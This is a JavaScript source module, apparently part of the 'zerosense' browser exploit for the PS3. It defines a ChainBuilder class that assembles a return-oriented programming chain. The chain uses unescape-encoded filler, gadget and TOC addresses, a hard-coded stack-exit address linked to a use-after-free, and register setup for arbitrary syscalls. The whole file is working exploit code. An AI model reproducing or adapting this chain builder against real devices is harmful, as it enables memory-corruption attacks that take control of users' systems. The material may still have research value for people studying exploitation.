var Util = require('zerosense/Util');

/**
 * SP_EXIT is the address of 0x39C1868 in 0x8fd8xxxx, which is the callstack of the uaf minus 2
 * Address to the double, offset by -0x10
 */
var SP_EXIT = 0x8FD8DCD0 - 0x10;

var ADDR_GTEMP = 0x8D000000;

class ChainBuilder {
	
	constructor() {
		this.data = "";
	}
	
	static setup2(addr) {
		var commas = unescape("\u8282");
		
		return unescape("\u0102\u7efb")
			+ Util.pad(0x30, commas)
			+ Util.int32(addr)
			+ unescape("\ufb7e");
	}
	
	static setup1(addr) {		
		return unescape("\u4141\u7efa")
			+ Util.int32(addr)
			+ unescape("\ufa7e");
	}
	
	create() {
		var AA = unescape("\u4141");
		
		var start = unescape("\u4141\u2a2f")
			+ Util.int32(Offsets.addrGadget1)
			+ Util.int32(Offsets.addrToc)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, Offsets.addrToc)
			+ Util.pad(0x70, AA);
			
		var end = Util.int64(0x0, Offsets.addrGadgetMod8)
			+ unescape("\u2f2a");
			
		return start + this.data + end;
	}
	
	syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out = ADDR_GTEMP) {
		var AA = unescape("\u4141");
		
		this.data += Util.int64(0x0, Offsets.addrGadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, ADDR_GTEMP)
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, Offsets.addrGadgetMod1)
			+ Util.pad(0x50, AA)
			+ Util.pad(0xC, AA)
			+ Util.int32(sc)
			+ Util.int32(r10)
			+ Util.int32(r8)
			+ Util.int32(r7)
			+ Util.int32(r6)
			+ Util.int32(r5)
			+ Util.int32(r4)
			+ Util.pad(0x4, AA)
			+ Util.int32(r9)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, r3)
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, Offsets.addrGadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, ADDR_GTEMP)
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, Offsets.addrGadgetMod4a)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31out)
			+ Util.int64(0x0, SP_EXIT)
			+ Util.pad(0x8, AA);
			
		return this;
	}
	
}

module.exports = ChainBuilder;